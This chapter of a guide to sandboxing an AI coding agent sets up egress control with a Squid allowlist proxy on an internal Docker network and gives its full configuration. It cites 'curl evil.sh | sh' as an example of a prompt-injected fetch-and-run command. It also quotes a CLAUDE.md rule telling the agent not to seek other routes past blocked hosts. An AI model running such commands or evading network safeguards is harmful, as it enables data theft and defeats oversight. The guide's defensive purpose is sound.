# 05 — Layer 2: egress control

> **Defends:** exfiltration (threat 3), prompt injection (threat 4), lateral
> movement (threat 7).

This is the highest-leverage control in the entire guide. If stolen secrets
cannot leave, they are not stolen. If `curl evil.sh | sh` cannot resolve, the
injection is inert.

> **The original note told you to run `your-org/tinyproxy-allowlist`. That image
> does not exist.** This page builds a real one from Alpine's packaged Squid —
> nothing to trust beyond Alpine's package signing, and about fifteen lines of
> config.

## How it works

Two networks. The agent sits on `egress`, declared `internal: true`, which means
Docker gives it **no default route**. This is not a firewall rule the agent
might find a way around — there is simply no path to the internet in its routing
table.

```yaml
networks:
  egress:
    internal: true      # no route out, at all
  internet: {}          # only the proxy is attached to this
```

The proxy is attached to both. It is the only door, and it is a door with a list.

```
agent ──► egress (internal) ──► egress-proxy ──► internet ──► allowlisted hosts only
```

## The proxy image

`proxy/Dockerfile`:

```dockerfile
FROM alpine:3.20
RUN apk add --no-cache squid \
 && mkdir -p /var/cache/squid /var/log/squid \
 && chown -R squid:squid /var/cache/squid /var/log/squid
COPY squid.conf /etc/squid/squid.conf
COPY allowlist.txt /etc/squid/allowlist.txt
EXPOSE 3128
CMD ["squid", "-N", "-d", "1", "-f", "/etc/squid/squid.conf"]
```

`-N` keeps Squid in the foreground so Docker owns the lifecycle; `-d 1` sends
logs to the console.

## The config, in full

`proxy/squid.conf`:

```
http_port 3128
visible_hostname agent-egress-proxy
cache_effective_user squid
cache_effective_group squid

acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 443
acl CONNECT method CONNECT
acl allowed_domains dstdomain "/etc/squid/allowlist.txt"

http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow allowed_domains
http_access deny all          # ← the important line

cache deny all
cache_mem 0 MB

logfile_rotate 0
access_log stdio:/dev/stdout squid
cache_log /dev/stderr

forwarded_for delete
via off
httpd_suppress_version_string on
connect_timeout 15 seconds
```

Rules are evaluated in order and **the first match wins**, so
`http_access deny all` at the end is the default and everything above it is a
carve-out. If you add rules, add them above that line.

`cache deny all` is deliberate: this is a policy gate, not a cache. Caching
would add a stateful component with no security benefit.

### On HTTPS and TLS interception

For HTTPS the agent issues `CONNECT api.anthropic.com:443` and Squid matches on
that hostname. **There is no TLS interception.** That means:

- No CA certificate to install into the container.
- No plaintext copy of the agent's traffic sitting on disk anywhere.
- No new way for the proxy itself to become a liability.

The tradeoff: you control **who** the agent talks to, not **what** it says. See
[Part 14 of the guide](../sandboxing-ai-coding-agent.md) for why that matters.

## The allowlist is your policy file

`proxy/allowlist.txt` — one host per line; a leading dot matches the domain and
all subdomains beneath it:

```
api.anthropic.com
.github.com              # github.com, api.github.com, codeload, ssh.github.com
.githubusercontent.com
.gitlab.com              # gitlab.com and altssh.gitlab.com
.npmjs.org
pypi.org
files.pythonhosted.org
```

It is bind-mounted into the container read-only, so editing it needs no rebuild:

```bash
./sandbox allow docs.internal.example.com     # append + SIGHUP the proxy
./sandbox reload                              # after editing the file by hand
```

Keep this list short and boring. Every entry is a channel data could leave
through — `.github.com` is already a generous one.

## Watch it work

```bash
./sandbox logs proxy
```

Every request, allowed and denied, with its verdict. `TCP_DENIED/403` is the
sound of the sandbox doing its job — and it names the exact hostname the agent
wanted, which is usually all you need to decide whether to allow it.

This log lives on the host, outside the container, so nothing inside can
retroactively edit it.

## Making blocks legible to the agent

A capable agent that hits a blocked host will reasonably try three other routes
before giving up. One line in `CLAUDE.md` ([07](07-profile.md)) converts that
into a clean request:

> Outbound network goes through an allowlist proxy. If a host is not on the list
> the connection fails — that is expected, not a bug to work around. Say which
> host you need and stop; do not look for another route out.

## Why not just use iptables?

The original note offered a host firewall as a "simpler alternative":

```bash
iptables -A OUTPUT -d api.anthropic.com -p tcp --dport 443 -j ACCEPT   # ← don't
```

This resolves `api.anthropic.com` to a **single IP address at the moment you
type the command** and pins that IP forever. The Anthropic API, GitHub, and npm
all sit behind CDNs with rotating address pools, so the rule silently stops
matching — sometimes within minutes. You end up with a firewall that appears to
enforce a policy while actually blocking legitimate traffic and, worse,
permitting whatever else has since been assigned that address.

Hostname-based allowlisting belongs at the proxy, where names are re-resolved
per request. Host-level `iptables -P OUTPUT DROP` is still a reasonable **outer**
layer if you want belt and braces — just don't rely on hostname rules in it.

## The genuinely stronger option

Run the sandbox in a cloud VPC subnet with **no NAT gateway and no internet
route**, reaching only VPC endpoints for the specific services you need. Nothing
to misconfigure at runtime, and the policy is auditable in your infrastructure
code rather than in a text file on a laptop.

Next: [06 — Layer 3, credentials](06-credentials.md).
